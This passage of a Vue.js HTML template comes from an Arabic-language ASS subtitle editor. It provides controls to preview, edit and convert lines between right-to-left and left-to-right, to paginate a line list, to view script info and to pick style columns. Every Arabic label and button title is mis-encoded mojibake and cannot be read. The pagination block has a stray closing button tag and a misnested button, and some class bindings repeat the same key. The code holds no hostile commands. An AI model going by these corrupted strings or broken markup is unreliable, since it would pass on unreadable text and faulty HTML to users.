                                <div class="flex items-center justify-between mb-2">
                                    <label class="text-sm font-medium text-gray-700 dark:text-gray-300">{{
                                        currentLine?.displaysRTL ? 'ÿßŸÑÿ≠ÿßŸÑŸä (RTL)' : 'ÿßŸÑÿ≠ÿßŸÑŸä (LTR)' }}</label>
                                    <div class="flex items-center gap-2">
                                        <span class="text-xs text-gray-500 dark:text-gray-400" dir="ltr">{{
                                            currentLine?.Start }} - {{ currentLine?.End }}</span>
                                        <span class="text-xs px-2 py-1 bg-gray-100 dark:bg-gray-700 rounded">{{
                                            currentLine?.Style }}</span>
                                    </div>
                                </div>
                                <textarea readonly :value="currentLine?.Text || ''"
                                    class="preview-box w-full p-3 bg-gray-50 dark:bg-gray-900 rounded-lg border border-gray-200 dark:border-gray-700 text-sm resize-y text-end"
                                    rows="2" :class="{ 'ltr': currentLine?.isArabic, 'ltr': !currentLine?.isArabic }"
                                    :dir="currentLine?.isArabic ? 'ltr' : 'ltr'"></textarea>
                            </div>

                            <div>
                                <div class="flex items-center justify-between mb-2">
                                    <div class="flex items-center gap-2">
                                        <label class="text-sm font-medium text-gray-700 dark:text-gray-300">{{
                                            currentLine?.isRTL ? 'ÿ™ÿπÿØŸäŸÑ (RTL)' : 'ŸÖÿπÿßŸäŸÜÿ© Ÿàÿ™ÿπÿØŸäŸÑ (RTL)' }}
                                        </label>
                                        <button @click="undoRtlEdit" :disabled="!canUndoRtlEdit"
                                            class="touch-target w-10 h-10 flex items-center justify-center bg-gray-100 dark:bg-gray-700 text-gray-700 dark:text-gray-300 rounded-lg hover:bg-gray-200 dark:hover:bg-gray-600 disabled:opacity-50 transition-theme"
                                            title="ÿ™ÿ±ÿßÿ¨ÿπ">
                                            <span class="w-full h-full flex items-center justify-center">
                                                <svg xmlns="http://www.w3.org/2000/svg" class="h-4 w-4 block" viewBox="0 0 20 20" fill="currentColor">
                                                    <path fill-rule="evenodd" d="M7.707 14.707a1 1 0 01-1.414 0l-4-4a1 1 0 010-1.414l4-4a1 1 0 011.414 1.414L5.414 9H11a5 5 0 110 10H9a1 1 0 110-2h2a3 3 0 100-6H5.414l2.293 2.293a1 1 0 010 1.414z" clip-rule="evenodd"/>
                                                </svg>
                                            </span>
                                        </button>
                                        <button @click="redoRtlEdit" :disabled="!canRedoRtlEdit"
                                            class="touch-target w-10 h-10 flex items-center justify-center bg-gray-100 dark:bg-gray-700 text-gray-700 dark:text-gray-300 rounded-lg hover:bg-gray-200 dark:hover:bg-gray-600 disabled:opacity-50 transition-theme"
                                            title="ÿ•ÿπÿßÿØÿ©">
                                            <span class="w-full h-full flex items-center justify-center">
                                                <svg xmlns="http://www.w3.org/2000/svg" class="h-4 w-4 block" viewBox="0 0 20 20" fill="currentColor">
                                                    <path fill-rule="evenodd" d="M12.293 14.707a1 1 0 001.414 0l4-4a1 1 0 000-1.414l-4-4a1 1 0 00-1.414 1.414L14.586 9H9a5 5 0 100 10h2a1 1 0 100-2H9a3 3 0 110-6h5.586l-2.293 2.293a1 1 0 000 1.414z" clip-rule="evenodd"/>
                                                </svg>
                                            </span>
                                        </button>
                                        <button @click="resetRtlEditToBase" :disabled="!canResetRtlEdit"
                                            class="touch-target w-10 h-10 flex items-center justify-center bg-gray-100 dark:bg-gray-700 text-gray-700 dark:text-gray-300 rounded-lg hover:bg-gray-200 dark:hover:bg-gray-600 disabled:opacity-50 transition-theme"
                                            title="ÿ•ÿπÿßÿØÿ© ÿ∂ÿ®ÿ∑">
                                            <span class="w-full h-full flex items-center justify-center">
                                                <svg xmlns="http://www.w3.org/2000/svg" class="h-4 w-4 block" viewBox="0 0 20 20" fill="currentColor">
                                                    <path d="M12 5V1L7 6l5 5V7a5 5 0 11-5 5H5a7 7 0 107-7z"/>
                                                </svg>
                                            </span>
                                        </button>
                                    </div>
                                    <div class="flex items-center gap-2">
                                        <button @click="convertRTLtoLTR" v-if="canConvertToLTR"
                                            class="text-xs px-3 py-1 bg-green-700 text-white rounded hover:opacity-90 transition-theme flex items-center gap-1">
                                            ÿ™ÿ≠ŸàŸäŸÑ ÿ•ŸÑŸâ LTR
                                        </button>
                                        <button @click="applyRTLConversion" v-else-if="canConvertToRTL"
                                            class="mr-2 text-xs px-2 py-1 bg-red-900 text-white rounded hover:opacity-90 transition-theme flex items-center gap-1">
                                            ÿ™ÿ≠ŸàŸäŸÑ ÿ•ŸÑŸâ RTL
                                        </button>
                                    </div>
                                </div>
                                <textarea v-model="rtlPreviewText"
                                class="preview-box w-full p-3 bg-gray-50 dark:bg-gray-900 rounded-lg border border-gray-200 dark:border-gray-700 text-sm resize-y focus:outline-none focus:ring-2 focus:ring-primary-light dark:focus:ring-primary-dark text-right"
                                dir="rtl" rows="2" @input="handleRTLTextEdit($event)"></textarea>
                            </div>
                        </div>

                        <div class="p-4 border-t border-gray-200 dark:border-gray-700">
                            <div class="flex flex-col sm:flex-row items-center justify-between gap-4">
                                <!-- Navigation Buttons -->
                                <div class="flex items-center gap-2 w-full sm:w-auto justify-center">
                                    <button @click="goToLastLine" :disabled="!canGoToLastFiltered"
                                        class="touch-target px-3 py-2 bg-gray-100 dark:bg-gray-700 text-gray-700 dark:text-gray-300 rounded-lg hover:bg-gray-200 dark:hover:bg-gray-600 disabled:opacity-50 transition-theme"
                                        title="ÿßŸÑÿ£ÿÆŸäÿ±">
                                        <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5" viewBox="0 0 20 20"
                                            fill="currentColor">
                                            <path fill-rule="evenodd"
                                                d="M4.293 4.293a1 1 0 011.414 0l5 5a1 1 0 010 1.414l-5 5a1 1 0 01-1.414-1.414L8.586 10 4.293 5.707a1 1 0 010-1.414zm6 0a1 1 0 011.414 0l5 5a1 1 0 010 1.414l-5 5a1 1 0 01-1.414-1.414L14.586 10l-4.293-4.293a1 1 0 010-1.414z"
                                                clip-rule="evenodd" />
                                        </svg>
                                    </button>
                                    <button @click="goToNextLine" :disabled="!canGoToNextFiltered"
                                        class="touch-target px-3 py-2 bg-gray-100 dark:bg-gray-700 text-gray-700 dark:text-gray-300 rounded-lg hover:bg-gray-200 dark:hover:bg-gray-600 disabled:opacity-50 transition-theme"
                                        title="ÿßŸÑÿ™ÿßŸÑŸä">
                                        <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5" viewBox="0 0 20 20"
                                            fill="currentColor">
                                            <path fill-rule="evenodd"
                                                d="M7.293 14.707a1 1 0 010-1.414L10.586 10 7.293 6.707a1 1 0 011.414-1.414l4 4a1 1 0 010 1.414l-4 4a1 1 0 01-1.414 0z"
                                                clip-rule="evenodd" />
                                        </svg>
                                    </button>
                                    <button @click="goToPreviousLine" :disabled="!canGoToPreviousFiltered"
                                        class="touch-target px-3 py-2 bg-gray-100 dark:bg-gray-700 text-gray-700 dark:text-gray-300 rounded-lg hover:bg-gray-200 dark:hover:bg-gray-600 disabled:opacity-50 transition-theme"
                                        title="ÿßŸÑÿ≥ÿßÿ®ŸÇ">
                                        <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5" viewBox="0 0 20 20"
                                            fill="currentColor">
                                            <path fill-rule="evenodd"
                                                d="M12.707 5.293a1 1 0 010 1.414L9.414 10l3.293 3.293a1 1 0 01-1.414 1.414l-4-4a1 1 0 010-1.414l4-4a1 1 0 011.414 0z"
                                                clip-rule="evenodd" />
                                        </svg>
                                    </button>
                                    <button @click="goToFirstLine" :disabled="!canGoToFirstFiltered"
                                        class="touch-target px-3 py-2 bg-gray-100 dark:bg-gray-700 text-gray-700 dark:text-gray-300 rounded-lg hover:bg-gray-200 dark:hover:bg-gray-600 disabled:opacity-50 transition-theme"
                                        title="ÿßŸÑÿ£ŸàŸÑ">
                                        <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5" viewBox="0 0 20 20"
                                            fill="currentColor">
                                            <path fill-rule="evenodd"
                                                d="M15.707 15.707a1 1 0 01-1.414 0l-5-5a1 1 0 010-1.414l5-5a1 1 0 111.414 1.414L11.414 10l4.293 4.293a1 1 0 010 1.414zm-6 0a1 1 0 01-1.414 0l-5-5a1 1 0 010-1.414l5-5a1 1 0 011.414 1.414L5.414 10l4.293 4.293a1 1 0 010 1.414z"
                                                clip-rule="evenodd" />
                                        </svg>
                                    </button>
                                </div>

                                <!-- Range Selector -->
                                <div class="flex items-center bg-gray-100 dark:bg-gray-700 rounded-lg px-2 py-1">
                                    <textarea v-model="rangeInput" @keydown.enter.prevent="handleRangeInput"
                                        placeholder="ÿ±ŸÇŸÖ ÿßŸÑÿ≥ÿ∑ÿ±..."
                                        class="bg-transparent border-none text-sm text-gray-700 dark:text-gray-200 placeholder-gray-400 focus:ring-0 w-24 h-8 resize-none outline-none py-1"
                                        style="min-height: 2rem;"></textarea>
                                    <button @click="handleRangeInput"
                                        class="px-3 py-1 text-sm bg-white dark:bg-gray-600 text-gray-700 dark:text-gray-100 border border-gray-300 dark:border-gray-500 rounded-md hover:bg-gray-50 dark:hover:bg-gray-500 transition-theme">
                                        ÿßÿ∞Ÿáÿ®
                                    </button>
                                </div>
                            </div>
                        </div>
                    </div>

                    <!-- Bottom Actions -->
                    <div class="mt-6 flex flex-col sm:flex-row items-center justify-between gap-4">
                        <button @click="bulkConvertToRTL" :disabled="isProcessing || convertibleToRTLCount === 0"
                            class="w-full sm:w-auto touch-target px-6 py-3 bg-yellow-800 text-white rounded-xl hover:opacity-90 disabled:opacity-50 transition-theme flex items-center justify-center gap-2 shadow-sm font-semibold">
                            <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5" fill="none" viewBox="0 0 24 24"
                                stroke="currentColor">
                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
                                    d="M8 7h12m0 0l-4-4m4 4l-4 4m0 6H4m0 0l4 4m-4-4l4-4" />
                            </svg>
                            <span v-if="isProcessing">ÿ¨ÿßÿ±Ÿä ÿßŸÑŸÖÿπÿßŸÑÿ¨ÿ©...</span>
                            <span v-else>ÿ™ÿ≠ŸàŸäŸÑ ÿßŸÑŸÉŸÑ ÿ•ŸÑŸâ RTL</span>
                        </button>
                        <button @click="openResetToOriginalConfirm" :disabled="!canResetToOriginal"
                            class="w-full sm:w-auto touch-target px-6 py-3 bg-rose-600 text-white rounded-xl hover:opacity-90 disabled:opacity-50 transition-theme flex items-center justify-center gap-2 shadow-sm font-semibold">
                            <svg xmlns="http://www.w3.org/2000/svg" class="h-4 w-4 block" viewBox="0 0 20 20" fill="currentColor"><path d="M12 5V1L7 6l5 5V7a5 5 0 11-5 5H5a7 7 0 107-7z"></path></svg>
                            ÿ•ÿπÿßÿØÿ© ÿ∂ÿ®ÿ∑ ÿßŸÑŸÖŸÑŸÅ
                        </button>
                        <button @click="exportAssFile"
                            class="w-full sm:w-auto touch-target px-6 py-3 bg-primary-light dark:bg-primary-dark text-white rounded-xl hover:opacity-90 transition-theme flex items-center justify-center gap-2 shadow-sm font-semibold">
                            <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5" fill="none" viewBox="0 0 24 24"
                                stroke="currentColor">
                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
                                    d="M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-4l-4 4m0 0l-4-4m4 4V4" />
                            </svg>
                            ÿ™ÿµÿØŸäÿ± ŸÖŸÑŸÅ ASS.
                        </button>
                    </div>
                </div>
            </main>

            <footer
                class="bg-white dark:bg-gray-800 border-t border-gray-200 dark:border-gray-700 py-1 transition-theme mt-auto">
                <div class="max-w-7xl mx-auto px-4 text-center text-sm text-gray-500 dark:text-gray-400 font-bold">
                    <div class="mt-1 text-base">
                        {{ copyrightYear }}¬© Developed by
                        <a href="https://t.me/CodeIII" target="_blank" rel="noopener noreferrer"
                            class="text-primary-light dark:text-primary-dark hover:underline">
                            Code
                        </a>
                    </div>
                    <div class="mt-1 text-sm" @dblclick="handleDummyVideoUnlockFirstStep">
                        v{{ version }} (2026-02-01)
                    </div>
                </div>
            </footer>

            <!-- Line List Modal (Updated with Filter) -->
            <div v-if="showLinesModalOpen" class="fixed inset-0 z-50 flex items-center justify-center p-4 modal-overlay">
                <div
                    class="bg-white dark:bg-gray-800 rounded-xl shadow-xl max-w-4xl w-full modal-content flex flex-col max-h-[90vh]">
                    <div
                        class="p-4 border-b border-gray-200 dark:border-gray-700 flex items-center justify-between shrink-0">
                        <h3 class="text-lg font-semibold">{{ linesModalTitle }}</h3>
                        <div class="flex items-center gap-2">
                            <button v-if="linesModalType === 'rtl' && filteredLines.some(l => l.isRTL)"
                                @click="convertFilteredToLTR"
                                class="text-sm px-3 py-1.5 bg-red-800 text-white rounded-lg hover:opacity-90 transition-theme">
                                ÿ™ÿ≠ŸàŸäŸÑ ÿßŸÑŸÉŸÑ ŸÑŸÄ LTR
                            </button>
                            <button @click="showLinesModalOpen = false"
                                class="text-gray-500 hover:text-gray-700 dark:hover:text-gray-300 text-2xl w-8 h-8 flex items-center justify-center rounded-full hover:bg-gray-100 dark:hover:bg-gray-700">&times;</button>
                        </div>
                    </div>
                    <div class="p-4 overflow-y-auto flex-1">
                        <div class="flex flex-wrap gap-4 mb-4">
                            <label class="inline-flex items-center gap-2 cursor-pointer select-none">
                                <input type="checkbox" v-model="showColTime"
                                    class="rounded border-gray-300 text-blue-600 shadow-sm focus:border-blue-300 focus:ring focus:ring-blue-200 focus:ring-opacity-50 dark:bg-gray-700 dark:border-gray-600">
                                <span class="text-sm font-medium text-gray-700 dark:text-gray-300">ÿßŸÑÿ™ŸàŸÇŸäÿ™</span>
                            </label>
                            <label class="inline-flex items-center gap-2 cursor-pointer select-none">
                                <input type="checkbox" v-model="showColStyle"
                                    class="rounded border-gray-300 text-blue-600 shadow-sm focus:border-blue-300 focus:ring focus:ring-blue-200 focus:ring-opacity-50 dark:bg-gray-700 dark:border-gray-600">
                                <span class="text-sm font-medium text-gray-700 dark:text-gray-300">ÿßŸÑŸÜŸÖÿ∑</span>
                            </label>
                            <label class="inline-flex items-center gap-2 cursor-pointer select-none">
                                <input type="checkbox" v-model="showColStatus"
                                    class="rounded border-gray-300 text-blue-600 shadow-sm focus:border-blue-300 focus:ring focus:ring-blue-200 focus:ring-opacity-50 dark:bg-gray-700 dark:border-gray-600">
                                <span class="text-sm font-medium text-gray-700 dark:text-gray-300">ÿßŸÑÿ≠ÿßŸÑÿ©</span>
                            </label>
                            <label class="inline-flex items-center gap-2 cursor-pointer select-none">
                                <input type="checkbox" v-model="showColText"
                                    class="rounded border-gray-300 text-blue-600 shadow-sm focus:border-blue-300 focus:ring focus:ring-blue-200 focus:ring-opacity-50 dark:bg-gray-700 dark:border-gray-600">
                                <span class="text-sm font-medium text-gray-700 dark:text-gray-300">ÿßŸÑŸÜÿµ</span>
                            </label>
                        </div>
                        <div class="overflow-x-auto">
                            <table class="w-full text-sm">
                                <thead>
                                    <tr class="border-b border-gray-200 dark:border-gray-700">
                                        <th class="text-right py-2 px-2">#</th>
                                        <th v-if="showColTime" class="text-right py-2 px-2">ÿßŸÑÿ™ŸàŸÇŸäÿ™</th>
                                        <th v-if="showColStyle" class="text-right py-2 px-2">ÿßŸÑŸÜŸÖÿ∑</th>
                                        <th v-if="showColStatus" class="text-right py-2 px-2">ÿßŸÑÿ≠ÿßŸÑÿ©</th>
                                        <th v-if="showColText" class="text-right py-2 px-2">ÿßŸÑŸÜÿµ</th>
                                    </tr>
                                </thead>
                                <tbody>
                                    <tr v-for="(line, index) in paginatedLines" :key="index"
                                        class="border-b border-gray-100 dark:border-gray-700 hover:bg-gray-50 dark:hover:bg-gray-700 cursor-pointer"
                                        @click="goToLine(line.originalIndex); showLinesModalOpen = false">
                                        <td class="py-2 px-2">{{ line.originalIndex + 1 }}</td>
                                        <td v-if="showColTime" class="py-2 px-2">{{ line.Start }} - {{ line.End }}</td>
                                        <td v-if="showColStyle" class="py-2 px-2">{{ line.Style }}</td>
                                        <td v-if="showColStatus" class="py-2 px-2">
                                            <span :class="[
                                                    'text-[11px] sm:text-xs px-1.5 sm:px-2 py-0.5 sm:py-1 rounded-full whitespace-nowrap inline-flex items-center justify-center',
                                                    line.displaysRTL ? 'bg-rtl-light dark:bg-rtl-dark text-white' : 
                                                    line.isArabic ? 'bg-warning-light dark:bg-warning-dark text-black' : 
                                                    'bg-ltr-light dark:bg-ltr-dark text-white'
                                                ]">
                                                <span v-if="line.displaysRTL">
                                                    RTL<span v-if="line.hasBidiNeutral" dir="ltr">Neutral</span>
                                                </span>
                                                <span v-else-if="line.isArabic">
                                                    ÿπÿ±ÿ®Ÿä <span dir="ltr">(LTR)</span><span v-if="line.hasBidiNeutral"
                                                        dir="ltr">Neutral</span>
                                                </span>
                                                <span v-else>LTR</span>
                                            </span>
                                        </td>
                                        <td v-if="showColText" class="py-2 px-2 max-w-xs text-right">
                                            <span class="block truncate-left">
                                                <span :class="{'ltr': line.isArabic, 'ltr': !line.isArabic}">{{ line.Text
                                                    }}</span>
                                            </span>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                        </div>
                        <!-- Pagination -->
                        <div class="mt-4 flex items-center justify-center gap-2">
                            </button>
                            <button @click="currentPage = totalPages" :disabled="currentPage === totalPages"
                                class="touch-target px-3 py-2 bg-gray-100 dark:bg-gray-700 text-gray-700 dark:text-gray-300 rounded-lg hover:bg-gray-200 dark:hover:bg-gray-600 disabled:opacity-50 transition-theme"
                                title="ÿßŸÑÿ£ÿÆŸäÿ±">
                                <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5" viewBox="0 0 20 20"
                                    fill="currentColor">
                                    <path fill-rule="evenodd"
                                        d="M4.293 4.293a1 1 0 011.414 0l5 5a1 1 0 010 1.414l-5 5a1 1 0 01-1.414-1.414L8.586 10 4.293 5.707a1 1 0 010-1.414zm6 0a1 1 0 011.414 0l5 5a1 1 0 010 1.414l-5 5a1 1 0 01-1.414-1.414L14.586 10l-4.293-4.293a1 1 0 010-1.414z"
                                        clip-rule="evenodd" />
                                </svg>
                            </button>
                            <button @click="currentPage++" :disabled="currentPage === totalPages"
                                class="touch-target px-3 py-2 bg-gray-100 dark:bg-gray-700 text-gray-700 dark:text-gray-300 rounded-lg hover:bg-gray-200 dark:hover:bg-gray-600 disabled:opacity-50 transition-theme"
                                title="ÿßŸÑÿ™ÿßŸÑŸä">
                                <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5" viewBox="0 0 20 20"
                                    fill="currentColor">
                                    <path fill-rule="evenodd"
                                        d="M7.293 14.707a1 1 0 010-1.414L10.586 10 7.293 6.707a1 1 0 011.414-1.414l4 4a1 1 0 010 1.414l-4 4a1 1 0 01-1.414 0z"
                                        clip-rule="evenodd" />
                                </svg>
                            </button>
                            <span class="px-4 text-sm text-gray-500 dark:text-gray-400 font-bold">
                                {{ currentPage }}/{{ totalPages }}
                            </span>
                            <button @click="currentPage--" :disabled="currentPage === 1"
                                class="touch-target px-3 py-2 bg-gray-100 dark:bg-gray-700 text-gray-700 dark:text-gray-300 rounded-lg hover:bg-gray-200 dark:hover:bg-gray-600 disabled:opacity-50 transition-theme"
                                title="ÿßŸÑÿ≥ÿßÿ®ŸÇ">
                                <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5" viewBox="0 0 20 20"
                                    fill="currentColor">
                                    <path fill-rule="evenodd"
                                        d="M12.707 5.293a1 1 0 010 1.414L9.414 10l3.293 3.293a1 1 0 01-1.414 1.414l-4-4a1 1 0 010-1.414l4-4a1 1 0 011.414 0z"
                                        clip-rule="evenodd" />
                                </svg>
                                <button @click="currentPage = 1" :disabled="currentPage === 1"
                                    class="touch-target px-3 py-2 bg-gray-100 dark:bg-gray-700 text-gray-700 dark:text-gray-300 rounded-lg hover:bg-gray-200 dark:hover:bg-gray-600 disabled:opacity-50 transition-theme"
                                    title="ÿßŸÑÿ£ŸàŸÑ">
                                    <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5" viewBox="0 0 20 20"
                                        fill="currentColor">
                                        <path fill-rule="evenodd"
                                            d="M15.707 15.707a1 1 0 01-1.414 0l-5-5a1 1 0 010-1.414l5-5a1 1 0 111.414 1.414L11.414 10l4.293 4.293a1 1 0 010 1.414zm-6 0a1 1 0 01-1.414 0l-5-5a1 1 0 010-1.414l5-5a1 1 0 011.414 1.414L5.414 10l4.293 4.293a1 1 0 010 1.414z"
                                            clip-rule="evenodd" />
                                    </svg>
                                </button>
                        </div>
                    </div>
                </div>
            </div>

            <!-- Script Info Modal (Translated) -->
            <div v-if="showScriptInfoModal" class="fixed inset-0 z-50 flex items-center justify-center p-4 modal-overlay">
                <div class="bg-white dark:bg-gray-800 rounded-xl shadow-xl max-w-2xl w-full modal-content">
                    <div class="p-4 border-b border-gray-200 dark:border-gray-700 flex items-center justify-between">
                        <h3 class="text-lg font-semibold">ŸÖÿπŸÑŸàŸÖÿßÿ™ ŸÖŸÑŸÅ ÿßŸÑÿ™ÿ±ÿ¨ŸÖÿ©</h3>
                        <button @click="showScriptInfoModal = false"
                            class="text-gray-500 hover:text-gray-700 dark:hover:text-gray-300 text-2xl">&times;</button>
                    </div>
                    <div class="p-4" dir="ltr">
                        <div v-if="scriptInfo.length === 0" class="text-center py-8 text-gray-500 dark:text-gray-400">
                            <p>ŸÑÿß ÿ™Ÿàÿ¨ÿØ ŸÖÿπŸÑŸàŸÖÿßÿ™ ŸÖÿ™ÿßÿ≠ÿ©</p>
                        </div>
                        <div v-else class="space-y-2">
                            <div v-for="(info, index) in scriptInfo" :key="index"
                                class="flex justify-between py-2 border-b border-gray-100 dark:border-gray-700">
                                <span class="font-medium text-gray-700 dark:text-gray-300">{{ info.key }}</span>
                                <span class="text-gray-500 dark:text-gray-400 text-right max-w-md truncate">{{ info.value
                                    }}</span>
                            </div>
                        </div>
                    </div>
                </div>
            </div>

            <div v-if="showFontsModal" class="fixed inset-0 z-50 flex items-center justify-center p-4 modal-overlay"
                dir="ltr">
                <div
                    class="bg-white dark:bg-gray-800 rounded-xl shadow-xl max-w-6xl w-full modal-content max-h-[90vh] overflow-hidden flex flex-col">
                    <div class="p-4 border-b border-gray-200 dark:border-gray-700">
                        <div class="flex items-center justify-between mb-4">
                            <h3 class="text-lg font-semibold">V4+ Styles</h3>
                            <div class="flex items-center gap-2">
                                <button @click="showStylesColumnCheckboxes = !showStylesColumnCheckboxes"
                                    class="px-3 py-1 bg-blue-600 text-white rounded text-sm hover:bg-blue-700 dark:bg-blue-500 dark:hover:bg-blue-600">
                                    {{ showStylesColumnCheckboxes ? 'ÿ•ÿÆŸÅÿßÿ° ÿßŸÑÿ£ÿπŸÖÿØÿ©' : 'ÿ•ÿ∏Ÿáÿßÿ± ÿßŸÑÿ£ÿπŸÖÿØÿ© ÿßŸÑÿ£ÿÆÿ±Ÿâ' }}
                                </button>
                                <button @click="showFontsModal = false"
                                    class="text-red-600 hover:text-gray-700 dark:hover:text-gray-300 text-3xl pl-4">&times;</button>
                            </div>
                        </div>
                        <div v-if="showStylesColumnCheckboxes" class="flex flex-wrap gap-4">
                            <label class="inline-flex items-center gap-2 cursor-pointer select-none">
                                <input type="checkbox" v-model="showColFontname"
                                    class="rounded border-gray-300 text-blue-600 shadow-sm focus:border-blue-300 focus:ring focus:ring-blue-200 focus:ring-opacity-50 dark:bg-gray-700 dark:border-gray-600">
                                <span class="text-sm font-medium text-gray-700 dark:text-gray-300">Fontname</span>
                            </label>
                            <label class="inline-flex items-center gap-2 cursor-pointer select-none">
                                <input type="checkbox" v-model="showColFontsize"
                                    class="rounded border-gray-300 text-blue-600 shadow-sm focus:border-blue-300 focus:ring focus:ring-blue-200 focus:ring-opacity-50 dark:bg-gray-700 dark:border-gray-600">
                                <span class="text-sm font-medium text-gray-700 dark:text-gray-300">Fontsize</span>
                            </label>
                            <label class="inline-flex items-center gap-2 cursor-pointer select-none">
                                <input type="checkbox" v-model="showColPrimaryColour"
                                    class="rounded border-gray-300 text-blue-600 shadow-sm focus:border-blue-300 focus:ring focus:ring-blue-200 focus:ring-opacity-50 dark:bg-gray-700 dark:border-gray-600">
                                <span class="text-sm font-medium text-gray-700 dark:text-gray-300">PrimaryColour</span>
                            </label>
                            <label class="inline-flex items-center gap-2 cursor-pointer select-none">
                                <input type="checkbox" v-model="showColSecondaryColour"
                                    class="rounded border-gray-300 text-blue-600 shadow-sm focus:border-blue-300 focus:ring focus:ring-blue-200 focus:ring-opacity-50 dark:bg-gray-700 dark:border-gray-600">
                                <span class="text-sm font-medium text-gray-700 dark:text-gray-300">SecondaryColour</span>
                            </label>
                            <label class="inline-flex items-center gap-2 cursor-pointer select-none">
                                <input type="checkbox" v-model="showColOutlineColour"
                                    class="rounded border-gray-300 text-blue-600 shadow-sm focus:border-blue-300 focus:ring focus:ring-blue-200 focus:ring-opacity-50 dark:bg-gray-700 dark:border-gray-600">
                                <span class="text-sm font-medium text-gray-700 dark:text-gray-300">OutlineColour</span>
                            </label>
                            <label class="inline-flex items-center gap-2 cursor-pointer select-none">
                                <input type="checkbox" v-model="showColBackColour"
                                    class="rounded border-gray-300 text-blue-600 shadow-sm focus:border-blue-300 focus:ring focus:ring-blue-200 focus:ring-opacity-50 dark:bg-gray-700 dark:border-gray-600">
                                <span class="text-sm font-medium text-gray-700 dark:text-gray-300">BackColour</span>
                            </label>
                            <label class="inline-flex items-center gap-2 cursor-pointer select-none">
                                <input type="checkbox" v-model="showColBold"
                                    class="rounded border-gray-300 text-blue-600 shadow-sm focus:border-blue-300 focus:ring focus:ring-blue-200 focus:ring-opacity-50 dark:bg-gray-700 dark:border-gray-600">
                                <span class="text-sm font-medium text-gray-700 dark:text-gray-300">Bold</span>
                            </label>
                            <label class="inline-flex items-center gap-2 cursor-pointer select-none">
                                <input type="checkbox" v-model="showColItalic"
                                    class="rounded border-gray-300 text-blue-600 shadow-sm focus:border-blue-300 focus:ring focus:ring-blue-200 focus:ring-opacity-50 dark:bg-gray-700 dark:border-gray-600">
                                <span class="text-sm font-medium text-gray-700 dark:text-gray-300">Italic</span>
                            </label>
                            <label class="inline-flex items-center gap-2 cursor-pointer select-none">
                                <input type="checkbox" v-model="showColUnderline"
                                    class="rounded border-gray-300 text-blue-600 shadow-sm focus:border-blue-300 focus:ring focus:ring-blue-200 focus:ring-opacity-50 dark:bg-gray-700 dark:border-gray-600">
                                <span class="text-sm font-medium text-gray-700 dark:text-gray-300">Underline</span>
                            </label>
                            <label class="inline-flex items-center gap-2 cursor-pointer select-none">
                                <input type="checkbox" v-model="showColStrikeOut"
                                    class="rounded border-gray-300 text-blue-600 shadow-sm focus:border-blue-300 focus:ring focus:ring-blue-200 focus:ring-opacity-50 dark:bg-gray-700 dark:border-gray-600">
                                <span class="text-sm font-medium text-gray-700 dark:text-gray-300">StrikeOut</span>
                            </label>
                            <label class="inline-flex items-center gap-2 cursor-pointer select-none">
                                <input type="checkbox" v-model="showColScaleX"
                                    class="rounded border-gray-300 text-blue-600 shadow-sm focus:border-blue-300 focus:ring focus:ring-blue-200 focus:ring-opacity-50 dark:bg-gray-700 dark:border-gray-600">
                                <span class="text-sm font-medium text-gray-700 dark:text-gray-300">ScaleX</span>
                            </label>
                            <label class="inline-flex items-center gap-2 cursor-pointer select-none">
                                <input type="checkbox" v-model="showColScaleY"
                                    class="rounded border-gray-300 text-blue-600 shadow-sm focus:border-blue-300 focus:ring focus:ring-blue-200 focus:ring-opacity-50 dark:bg-gray-700 dark:border-gray-600">
                                <span class="text-sm font-medium text-gray-700 dark:text-gray-300">ScaleY</span>
                            </label>
                            <label class="inline-flex items-center gap-2 cursor-pointer select-none">
                                <input type="checkbox" v-model="showColSpacing"
                                    class="rounded border-gray-300 text-blue-600 shadow-sm focus:border-blue-300 focus:ring focus:ring-blue-200 focus:ring-opacity-50 dark:bg-gray-700 dark:border-gray-600">
                                <span class="text-sm font-medium text-gray-700 dark:text-gray-300">Spacing</span>
                            </label>
                            <label class="inline-flex items-center gap-2 cursor-pointer select-none">
                                <input type="checkbox" v-model="showColAngle"
                                    class="rounded border-gray-300 text-blue-600 shadow-sm focus:border-blue-300 focus:ring focus:ring-blue-200 focus:ring-opacity-50 dark:bg-gray-700 dark:border-gray-600">
                                <span class="text-sm font-medium text-gray-700 dark:text-gray-300">Angle</span>
                            </label>
                            <label class="inline-flex items-center gap-2 cursor-pointer select-none">
                                <input type="checkbox" v-model="showColBorderStyle"
                                    class="rounded border-gray-300 text-blue-600 shadow-sm focus:border-blue-300 focus:ring focus:ring-blue-200 focus:ring-opacity-50 dark:bg-gray-700 dark:border-gray-600">
                                <span class="text-sm font-medium text-gray-700 dark:text-gray-300">BorderStyle</span>
                            </label>
                            <label class="inline-flex items-center gap-2 cursor-pointer select-none">
                                <input type="checkbox" v-model="showColOutline"
                                    class="rounded border-gray-300 text-blue-600 shadow-sm focus:border-blue-300 focus:ring focus:ring-blue-200 focus:ring-opacity-50 dark:bg-gray-700 dark:border-gray-600">
                                <span class="text-sm font-medium text-gray-700 dark:text-gray-300">Outline</span>
                            </label>
                            <label class="inline-flex items-center gap-2 cursor-pointer select-none">
                                <input type="checkbox" v-model="showColShadow"
                                    class="rounded border-gray-300 text-blue-600 shadow-sm focus:border-blue-300 focus:ring focus:ring-blue-200 focus:ring-opacity-50 dark:bg-gray-700 dark:border-gray-600">
                                <span class="text-sm font-medium text-gray-700 dark:text-gray-300">Shadow</span>
                            </label>
                            <label class="inline-flex items-center gap-2 cursor-pointer select-none">
                                <input type="checkbox" v-model="showColAlignment"
                                    class="rounded border-gray-300 text-blue-600 shadow-sm focus:border-blue-300 focus:ring focus:ring-blue-200 focus:ring-opacity-50 dark:bg-gray-700 dark:border-gray-600">
                                <span class="text-sm font-medium text-gray-700 dark:text-gray-300">Alignment</span>
                            </label>
                            <label class="inline-flex items-center gap-2 cursor-pointer select-none">
